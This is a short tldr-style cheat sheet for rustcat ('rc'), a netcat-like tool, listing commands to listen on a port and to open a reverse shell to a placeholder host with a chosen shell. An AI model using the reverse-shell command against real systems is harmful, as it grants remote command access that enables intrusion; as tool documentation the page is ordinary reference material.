# rc

> A modern simplistic port listener & reverse shell.
> Similar to `nc`.
> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening on a specific port:

`rc -lp {{port}}`

- Start a reverse shell:

`rc {{host}} {{port}} -r {{shell}}`
